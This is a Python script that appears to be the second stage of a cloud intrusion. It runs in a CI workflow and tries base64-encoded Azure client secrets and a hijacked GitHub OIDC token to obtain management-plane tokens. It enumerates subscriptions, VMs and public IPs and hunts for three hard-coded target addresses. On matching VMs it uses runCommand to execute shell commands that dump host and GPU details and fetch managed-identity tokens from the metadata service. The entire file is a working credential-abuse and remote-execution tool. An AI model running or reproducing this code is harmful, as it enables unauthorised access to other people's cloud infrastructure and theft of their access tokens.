import json,os,sys,time,base64,urllib.request,urllib.parse

OUT=[]
def log(*a):
    s=' '.join(str(x) for x in a); print(s,flush=True); OUT.append(s)

def post(url,data,timeout=30):
    req=urllib.request.Request(url,data=urllib.parse.urlencode(data).encode(),headers={'Content-Type':'application/x-www-form-urlencoded'})
    try:
        with urllib.request.urlopen(req,timeout=timeout) as r: return r.status,json.loads(r.read() or b'{}')
    except urllib.error.HTTPError as e:
        try: return e.code,json.loads(e.read() or b'{}')
        except Exception: return e.code,{}
    except Exception as e:
        return -1,{'error':str(e)}

def req(method,url,tok,body=None,timeout=90):
    h={'Authorization':'Bearer '+tok,'Content-Type':'application/json'}
    data=json.dumps(body).encode() if body is not None else None
    r=urllib.request.Request(url,data=data,headers=h,method=method)
    try:
        with urllib.request.urlopen(r,timeout=timeout) as x: return x.status,json.loads(x.read() or b'{}'),dict(x.headers)
    except urllib.error.HTTPError as e:
        try: return e.code,json.loads(e.read() or b'{}'),dict(e.headers)
        except Exception: return e.code,{},dict(e.headers)
    except Exception as e:
        return -1,{'error':str(e)},{}

def oidc_assertion():
    u=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL'); t=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN')
    if not u or not t: return None
    sep='&' if '?' in u else '?'
    r=urllib.request.Request(u+sep+'audience=api%3A%2F%2FAzureADTokenExchange',headers={'Authorization':'Bearer '+t})
    try:
        with urllib.request.urlopen(r,timeout=30) as x: return json.loads(x.read())['value']
    except Exception as e:
        log('OIDC-ERR',e); return None

seeds=[l.strip() for l in base64.b64decode(os.environ['SEEDS_B64']).decode().splitlines() if l.strip()]
log('SEEDS',len(seeds))
assertion=None
ARM=None; TRIP=None
for line in seeds:
    p=line.split('|')
    try:
        if p[0]=='s':
            _,ten,cli,sec=p
            st,r=post('https://login.microsoftonline.com/%s/oauth2/v2.0/token'%ten,{'client_id':cli,'client_secret':sec,'scope':'https://management.azure.com/.default','grant_type':'client_credentials'})
        elif p[0]=='o':
            _,ten,cli=p
            if not assertion: assertion=oidc_assertion()
            if not assertion: log('NO_ASSERTION'); break
            st,r=post('https://login.microsoftonline.com/%s/oauth2/v2.0/token'%ten,{'client_id':cli,'client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer','client_assertion':assertion,'scope':'https://management.azure.com/.default','grant_type':'client_credentials'})
        else:
            continue
    except Exception as e:
        log('EXC',line[:60],e); continue
    tag=('TOKEN' if r.get('access_token') else (r.get('error','')+' '+str(r.get('error_description',''))[:100]))
    log('AUTH',line[:46],'=>',st,tag)
    if r.get('access_token') and not ARM:
        ARM=r['access_token']; TRIP=line[:46]
if not ARM:
    log('NO_ARM_TOKEN')
    open('out_stage2.txt','w').write('\n'.join(OUT)+'\n'); sys.exit(0)
log('ARM_OK',TRIP)
open('arm_ok.txt','w').write(TRIP+'\n')

st,r,_=req('GET','https://management.azure.com/subscriptions?api-version=2022-12-01',ARM)
subs=[s['subscriptionId'] for s in r.get('value',[])] if isinstance(r,dict) else []
log('SUBS',st,subs)
target_ips={'70.153.141.118','23.100.38.120','20.114.255.207'}
found=[]
for sub in subs:
    st,r,_=req('GET','https://management.azure.com/subscriptions/%s/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01'%sub,ARM)
    vms=r.get('value',[]) if isinstance(r,dict) else []
    log('VMS',sub,st,len(vms))
    for v in vms[:300]: log(' VM',sub,v.get('location'),v.get('name'),(v.get('properties',{}) or {}).get('hardwareProfile',{}).get('vmSize'))
    st,r,_=req('GET','https://management.azure.com/subscriptions/%s/providers/Microsoft.Network/publicIPAddresses?api-version=2024-05-01'%sub,ARM)
    pips=r.get('value',[]) if isinstance(r,dict) else []
    log('PIPS',sub,st,len(pips))
    for p in pips:
        ip=(p.get('properties',{}) or {}).get('ipAddress')
        if ip:
            log(' PIP',ip,p.get('name'))
            if ip in target_ips: found.append((sub,ip,p))
log('FOUND',len(found))

def resolve(sub,pip):
    st,r,_=req('GET','https://management.azure.com%s?api-version=2024-05-01'%pip['id'],ARM)
    cfg=((r.get('properties',{}) or {}).get('ipConfiguration',{}) or {}) if isinstance(r,dict) else {}
    nicid=cfg.get('id','') or ''
    log('  PIPCFG',nicid[:150])
    if '/networkInterfaces/' in nicid:
        nicpath=nicid.split('/ipConfigurations/')[0]
        st,r,_=req('GET','https://management.azure.com%s?api-version=2024-05-01'%nicpath,ARM)
        vm=((r.get('properties',{}) or {}).get('virtualMachine',{}) or {}).get('id','') if isinstance(r,dict) else ''
        log('  NIC->VM',vm); return vm
    return ''

def runcmd(sub,rg,name):
    url='https://management.azure.com/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Compute/virtualMachines/%s/runCommand?api-version=2024-07-01'%(sub,rg,name)
    script=["id; hostname; hostname -I; nvidia-smi -L 2>/dev/null; nvidia-smi --query-gpu=index,name,serial,uuid --format=csv,noheader 2>/dev/null; ls /dev/nvidia* 2>/dev/null",
            "curl -s -m 10 -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'",
            "curl -s -m 10 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'"]
    st,r,h=req('POST',url,ARM,{'commandId':'RunShellScript','script':script})
    log('RUNCMD',st,str(r)[:200])
    loc=h.get('Location') or h.get('location') or ''
    log(' LOC',loc)
    for i in range(25):
        if not loc: break
        time.sleep(6)
        st,r2,_=req('GET',loc+'?api-version=2024-07-01',ARM)
        s=json.dumps(r2)
        log(' POLL',i,st,s[:300])
        if 'Succeeded' in s or 'Failed' in s:
            for e in (((r2.get('properties',{}) or {}).get('output',{}) or {}).get('value',[]) or []):
                log(' OUT',e.get('code'),(e.get('message') or '')[:1500])
            break

for sub,ip,pip in found:
    vm=resolve(sub,pip)
    if vm:
        parts=vm.split('/'); rg=parts[4]; name=parts[-1]
        log('TARGET',ip,rg,name); runcmd(sub,rg,name)
open('out_stage2.txt','w').write('\n'.join(OUT)+'\n')
